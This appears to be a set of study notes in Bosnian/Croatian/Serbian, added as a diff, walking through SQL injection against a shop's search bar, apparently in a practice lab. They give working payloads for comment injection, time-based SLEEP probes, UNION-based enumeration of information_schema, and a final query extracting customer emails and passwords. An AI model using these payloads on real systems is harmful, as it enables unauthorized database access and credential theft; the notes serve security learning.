@@ -1,0 +1,60 @@
+--1.Upit za pretragu itema bi mogao izgledati ovako:
+
+SELECT x FROM x WHERE x LIKE '%rijec%';
+
+--x u ovom slucaju oznacava da ne znamo kako se zovu tabele i kolone (posto ni napadac to ne zna)
+
+--ako u search bar ukucamo: ';%23
+--app ce nam vratiti sve items iz baze
+--%23 oznacava tarabu (#) koja se koristi kao komentar u mysql-u
+--dakle upit glasi ovako:
+
+SELECT x FROM x WHERE x LIKE '%';#%'
+
+--ugl ovdje javlja gresku jer sql i mysql nisu bas identicni po pitanju komentara. U sql komentar -- radi normala, u mysql kakok kad.
+U mysql za komentare koristiti #
+
+--2.Upit koji vraća iteme kojima je zadnje slovo u imenu 7 i pri tome čeka po 2 sekunde da dobavi svaki:
+
+ukucavamo u search bar:  7' AND 0=SLEEP(2);%23
+
+--3. vraća sve galaxy proizvode i cega po 2 sekunde za svaki:
+
+galaxy%25' AND 0=SLEEP(2);%23
+
+%25 --- procenat u uri coding
+
+--4. pravi novi item sa slikom 5, nazivom 2, kategorijom 4, cijenom 3 i id-jem 1:
+
+galaxy%25' UNION(SELECT 1, 2, 3, 4, 5 FROM dual);%23
+
+ovo dual je pseudotabela koja se koristi za testiranje. Ovaj upit gore sa UNION treba da nadoda na neku tabelu novi red popunjen vrijednostima 
+the fact that we can output queries to the screen is super bad news btw
+
+mysql ima u sebi information schema tabelu gdje cuva info o tabelama koje imamo u bazi
+let's break into it >:)
+
+--5. saznamo nazive tabela
+
+7' UNION(SELECT 1,TABLE_NAME, TABLE_SCHEMA,1,1 FROM information_schema.tables);%23
+
+ove jedinice su tu jer smo iz prethodnog napada skontali da tabela koju smo probili u
+search baru ima 5 kolona
+ovim cudom cemo iz search bara dobiti imena baza i imena tabela
+
+sad znamo koje tabele imamo u bazi
+
+idemo napasti tabelu customers jer je imamo lmao
+
+---6. saznamo koje kolone postoje u tabeli customers
+
+7' UNION(SELECT 1, COLUMN_NAME, 1,1,1 FROM information_schema.columns WHERE TABLE_NAME = 'customers');%23
+
+---7. krademo iz customers
+
+ 7' UNION(SELECT 1, email, user_id ,sifra,last_name FROM customers);%23
+
+ --email se pojavi u nazivu
+ --sifra u kategoriji
+ --id kao cijena
+
